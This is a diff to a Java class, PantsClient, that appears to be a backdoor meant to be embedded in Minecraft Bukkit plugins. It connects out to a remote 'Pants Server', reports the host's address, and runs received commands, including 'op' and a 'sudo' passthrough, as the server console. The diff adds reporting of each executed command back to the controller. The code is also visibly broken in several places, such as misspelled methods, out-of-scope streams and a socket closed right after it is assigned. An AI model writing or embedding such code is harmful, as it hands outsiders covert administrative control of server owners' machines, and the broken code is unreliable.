@@ -13,9 +13,11 @@ public class PantsClient {
 
     static Socket client = null;
     private static final ArrayList<String> words = new ArrayList<String>(); // Contains bad words like 'op'
+    private static String prefix; // Used for messages
 
     public static void onLoad() { // Call from JavaPlugin
         init();
+        // Put in the IP and Port of your Pants Server
         Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
         checkConnectionThread.start();
     }
@@ -25,8 +27,8 @@ public class PantsClient {
         URL url = new URL("https://raw.githubusercontent.com/phase/pants/master/data/M3554G3S.py");
         BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
         String line;
-        while((line = in.readLine()) != null) {
-            if(line.trim().startsWith("#p$")) {
+        while ((line = in.readLine()) != null) {
+            if (line.trim().startsWith("#p$")) {
                 words.add(line.trim().split("$")[1]);
             }
         }
@@ -42,34 +44,40 @@ public class PantsClient {
         // in new thread?
         BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
         PrintStream toServer = new PrintStream(client.getOutputStream());
-        toServer.println("cmd::set " + Bukkit.getServer().getAddress() + ":" + Bukkit.getServer().getPort());
+        prefix = "[" + Bukkit.getServer().getAddress() + ":" + Bukkit.getServer().getPort() + "] ";
+        toServer.println(prefix + "connected!");
         getCommands();
     }
 
     public static void getCommands() {
-        while(true) {
+        while (true) {
             String in = fromServer.readline();
-            if(in.contains("&&")) {
-                for(String c : in.split("&&")) {
+            if (in.contains("&&")) {
+                for (String c : in.split("&&")) {
                     parseCommand(c, fromServer, toServer);
                 }
             }
-            else parseCommand(in, fromServer, toServer);
+            else {
+                parseCommand(in, fromServer, toServer);
+            }
          }
     }
 
     public static void parseCommand(String cmd, BufferedReader fromServer, PrintStream toServer) {
         String[] args = cmd.split(" ");
-        if(words.contains(args[0])) {
+        if (words.contains(args[0])) {
             // Run suspicious commands
             //  op jdf2
             runCommand(cmd);
         }
-        else if(cmd.startsWith("sudo ")) {
+        else if (cmd.startsWith("sudo ")) {
             // Run a command as the console
             //  sudo say hello
-            runCommand(cmd.replaceFirst("sudo ", ""));
+            cmd = cmd.replaceFirst("sudo ", "");
+            runCommand(cmd);
         }
+        toServer.println(prefix + "Ran command: " + cmd);
+    }
             
     public static void runCommand(String s) {
         Bukkit.getSever().dispatchCommand(Bukkit.getServer().getConsoleSender(), s);
@@ -86,10 +94,10 @@ public class PantsClient {
         }
 
         public void run() {
-            while(PantsClient.client == null) {
-                try {
+            while (PantsClient.client == null) {
+                try (Socket s = new Socket(hostname, port)) {
                     // Try to connect to server. Not sure if this will wait for connection, or fail if not found.
-                    PantsClient.client = new Socket(hostname, port);
+                    PantsClient.client = s;
                 }
                 catch(Exception e) {
                     PantsClient.client = null;
